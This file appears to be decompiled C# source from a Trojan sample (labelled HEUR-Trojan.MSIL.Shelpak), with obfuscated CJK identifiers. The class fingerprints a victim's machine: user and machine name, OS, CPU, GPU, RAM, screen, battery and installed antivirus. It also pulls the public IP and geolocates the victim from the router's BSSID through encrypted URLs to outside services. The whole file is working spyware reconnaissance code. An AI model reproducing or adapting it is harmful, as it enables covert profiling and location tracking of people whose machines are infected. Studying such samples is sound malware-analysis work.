// Decompiled with JetBrains decompiler
// Type: 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山.弋网彡糸辵甘而疋卜广
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using 曰乙屮月彡乙夊禾寸白衣匚子頁冖;

namespace 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山
{
  internal sealed class 弋网彡糸辵甘而疋卜广
  {
    public static string 夊示車齊匸非土鳥宀龠臼瓜 = Environment.UserName;
    public static string 皿匚凵尢丿龍尢戈面革攴大士鳥爿 = Environment.MachineName;
    public static string 犬木目巾夂父廾虍夂艮目氏小舛魚山 = CultureInfo.CurrentCulture.ToString();
    public static string 釆尢文女冖面鬼无攴身宀至夂 = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

    [DllImport("iphlpapi.dll", EntryPoint = "SendARP")]
    private static extern int 干父口亠豆牛行爿止香匚比(
      int 豕豆欠虍月方韋刀人冂韋馬鼎,
      int 尢艸甘角矛戶色比高釆父,
      byte[] 小冂小鹵匚入辵非力尸卩手方,
      ref uint 牙彡魚儿卩言文曰囗耳夂火);

    public static string 曰日一斗見大刀又爿身文()
    {
      Rectangle bounds = Screen.GetBounds(Point.Empty);
      int width = bounds.Width;
      int height = bounds.Height;
      return width.ToString() + "x" + height.ToString();
    }

    public static string 黹戈卩靑二而比阜龜斗工()
    {
      try
      {
        string str1 = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
        string[] strArray = SystemInformation.PowerStatus.BatteryLifePercent.ToString().Split(',');
        string str2 = strArray[strArray.Length - 1];
        return str1 + " (" + str2 + "%)";
      }
      catch
      {
      }
      return "Unknown";
    }

    private static string 匸鬯子示弓言鼠儿支一玉骨()
    {
      string str = "Unknown System";
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem"))
        {
          foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
            str = Convert.ToString(managementBaseObject["Name"]);
          str = str.Split('|')[0];
          int length = str.Split(' ')[0].Length;
          str = str.Substring(length).TrimStart().TrimEnd();
        }
      }
      catch
      {
      }
      return str;
    }

    private static string 非丨犬丶斗禾冫雨尢瓜弋()
    {
      try
      {
        return Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86") ? "(32 Bit)" : "(64 Bit)";
      }
      catch
      {
      }
      return "(Unknown)";
    }

    public static string 赤土厂耒亠皮甘而亅靑麥目() => 弋网彡糸辵甘而疋卜广.匸鬯子示弓言鼠儿支一玉骨() + " " + 弋网彡糸辵甘而疋卜广.非丨犬丶斗禾冫雨尢瓜弋();

    public static string 冖臼宀手艸尢尢山皮冂木几力()
    {
      try
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("Select ProcessorId From Win32_processor").Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            return enumerator.Current["ProcessorId"].ToString();
        }
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string 羽羊夂匕心夂里糸穴襾匸勹肉广()
    {
      try
      {
        return ((IEnumerable<NetworkInterface>) NetworkInterface.GetAllNetworkInterfaces()).Where<NetworkInterface>((Func<NetworkInterface, bool>) (n => n.OperationalStatus == OperationalStatus.Up)).Where<NetworkInterface>((Func<NetworkInterface, bool>) (n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)).SelectMany<NetworkInterface, GatewayIPAddressInformation>((Func<NetworkInterface, IEnumerable<GatewayIPAddressInformation>>) (n =>
        {
          IPInterfaceProperties ipProperties = n.GetIPProperties();
          return ipProperties == null ? (IEnumerable<GatewayIPAddressInformation>) null : (IEnumerable<GatewayIPAddressInformation>) ipProperties.GatewayAddresses;
        })).Select<GatewayIPAddressInformation, IPAddress>((Func<GatewayIPAddressInformation, IPAddress>) (g => g?.Address)).Where<IPAddress>((Func<IPAddress, bool>) (a => a != null)).FirstOrDefault<IPAddress>().ToString();
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string 几戶鼎而殳日骨舛牙金干手又勹宀牙二()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
        {
          List<string> stringList = new List<string>();
          foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
            stringList.Add(managementBaseObject["displayName"].ToString());
          return stringList.Count == 0 ? "Not installed" : string.Join(", ", stringList.ToArray()) + ".";
        }
      }
      catch
      {
      }
      return "N/A";
    }

    public static string 彐毋廾父氏氏釆匕首冂立皿()
    {
      try
      {
        foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
        {
          if (address.AddressFamily == AddressFamily.InterNetwork)
            return address.ToString();
        }
      }
      catch
      {
      }
      return "No network adapters with an IPv4 address in the system!";
    }

    public static string 頁飛寸豸釆土鼻黍食而殳目方辵干()
    {
      try
      {
        return new WebClient().DownloadString(女立又口匕夂黑臣爿囗寸鬯.夂皿犬二黑无片片无臼血爪儿(new byte[32]
        {
          (byte) 172,
          (byte) 132,
          (byte) 62,
          (byte) 84,
          (byte) 188,
          (byte) 245,
          (byte) 252,
          (byte) 173,
          (byte) 117,
          (byte) 82,
          (byte) 97,
          (byte) 91,
          (byte) 237,
          (byte) 238,
          (byte) 214,
          (byte) 39,
          (byte) 28,
          (byte) 15,
          (byte) 241,
          (byte) 23,
          (byte) 15,
          (byte) 251,
          (byte) 204,
          (byte) 131,
          (byte) 247,
          (byte) 237,
          (byte) 166,
          (byte) 92,
          (byte) 82,
          (byte) 85,
          (byte) 22,
          (byte) 172
        })).Replace("\n", "");
      }
      catch
      {
      }
      return "Request failed";
    }

    private static string 骨瓜臣毛入非爿夂日羊尢()
    {
      byte[] 小冂小鹵匚入辵非力尸卩手方 = new byte[6];
      uint length = (uint) 小冂小鹵匚入辵非力尸卩手方.Length;
      try
      {
        if (弋网彡糸辵甘而疋卜广.干父口亠豆牛行爿止香匚比(BitConverter.ToInt32(IPAddress.Parse(弋网彡糸辵甘而疋卜广.羽羊夂匕心夂里糸穴襾匸勹肉广()).GetAddressBytes(), 0), 0, 小冂小鹵匚入辵非力尸卩手方, ref length) != 0)
          return "unknown";
        string[] strArray = new string[(int) length];
        for (int index = 0; (long) index < (long) length; ++index)
          strArray[index] = 小冂小鹵匚入辵非力尸卩手方[index].ToString("x2");
        return string.Join(":", strArray);
      }
      catch
      {
      }
      return "Failed";
    }

    public static string 夊止山角臣高文尸凵戈日网子()
    {
      string str1 = 弋网彡糸辵甘而疋卜广.骨瓜臣毛入非爿夂日羊尢();
      string str2 = "Unknown";
      string str3 = "Unknown";
      string str4 = "Unknown";
      string str5;
      try
      {
        using (WebClient webClient = new WebClient())
          str5 = webClient.DownloadString(女立又口匕夂黑臣爿囗寸鬯.夂皿犬二黑无片片无臼血爪儿(new byte[64]
          {
            (byte) 91,
            (byte) 185,
            (byte) 159,
            (byte) 48,
            (byte) 60,
            (byte) 79,
            (byte) 139,
            (byte) 159,
            (byte) 124,
            (byte) 37,
            (byte) 212,
            (byte) 232,
            (byte) 253,
            (byte) 2,
            (byte) 176,
            (byte) 189,
            (byte) 141,
            (byte) 243,
            (byte) 199,
            (byte) 107,
            (byte) 13,
            (byte) 252,
            (byte) 71,
            (byte) 66,
            (byte) 122,
            (byte) 29,
            (byte) 213,
            (byte) 176,
            (byte) 205,
            (byte) 11,
            (byte) 172,
            (byte) 67,
            (byte) 107,
            (byte) 43,
            (byte) 94,
            (byte) 178,
            (byte) 129,
            (byte) 142,
            (byte) 99,
            (byte) 210,
            (byte) 172,
            (byte) 1,
            (byte) 13,
            (byte) 123,
            (byte) 158,
            (byte) 81,
            (byte) 183,
            (byte) 66,
            byte.MaxValue,
            (byte) 162,
            (byte) 185,
            (byte) 157,
            (byte) 75,
            (byte) 7,
            (byte) 48,
            (byte) 125,
            (byte) 76,
            (byte) 21,
            (byte) 246,
            (byte) 190,
            (byte) 35,
            (byte) 164,
            (byte) 108,
            (byte) 141
          }) + str1);
      }
      catch
      {
        return "BSSID: " + str1;
      }
      if (!str5.Contains("{\"result\":200"))
        return "BSSID: " + str1;
      int index = 0;
      string[] strArray = str5.Split(' ');
      foreach (string str6 in strArray)
      {
        ++index;
        if (str6.Contains("\"lat\":"))
          str2 = strArray[index].Replace(",", "");
        if (str6.Contains("\"lon\":"))
          str3 = strArray[index].Replace(",", "");
        if (str6.Contains("\"range\":"))
          str4 = strArray[index].Replace(",", "");
      }
      string str7 = "BSSID: " + str1 + "\nLatitude: " + str2 + "\nLongitude: " + str3 + "\nRange: " + str4;
      if (str2 != "Unknown" && str3 != "Unknown")
        str7 = str7 + "\n[Open google maps](" + 女立又口匕夂黑臣爿囗寸鬯.夂皿犬二黑无片片无臼血爪儿(new byte[48]
        {
          (byte) 206,
          (byte) 105,
          (byte) 162,
          (byte) 71,
          (byte) 154,
          (byte) 101,
          (byte) 143,
          (byte) 133,
          (byte) 216,
          (byte) 233,
          (byte) 4,
          (byte) 78,
          (byte) 251,
          (byte) 231,
          (byte) 127,
          (byte) 197,
          (byte) 50,
          (byte) 50,
          (byte) 5,
          (byte) 167,
          (byte) 22,
          (byte) 30,
          (byte) 67,
          (byte) 50,
          (byte) 30,
          (byte) 134,
          (byte) 116,
          (byte) 165,
          (byte) 251,
          (byte) 47,
          (byte) 202,
          (byte) 115,
          (byte) 111,
          (byte) 224,
          (byte) 166,
          (byte) 249,
          (byte) 5,
          (byte) 156,
          (byte) 140,
          (byte) 131,
          (byte) 223,
          (byte) 55,
          (byte) 212,
          (byte) 39,
          (byte) 236,
          (byte) 254,
          (byte) 69,
          (byte) 45
        }) + str2 + " " + str3 + ")";
      return str7;
    }

    public static string 舌阜角辵文黍馬丶宀亠里冖方()
    {
      try
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            return enumerator.Current["Name"].ToString();
        }
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string 赤糸車彡夂豸穴心黹而矢牛十弋()
    {
      try
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            return enumerator.Current["Name"].ToString();
        }
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string 田氏豆比卜尢卩山彐手羽辛人()
    {
      try
      {
        int num = 0;
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
          {
            if (enumerator.MoveNext())
              num = (int) (Convert.ToDouble(enumerator.Current["TotalPhysicalMemory"]) / 1048576.0);
          }
        }
        return num.ToString() + "MB";
      }
      catch
      {
      }
      return "-1";
    }
  }
}
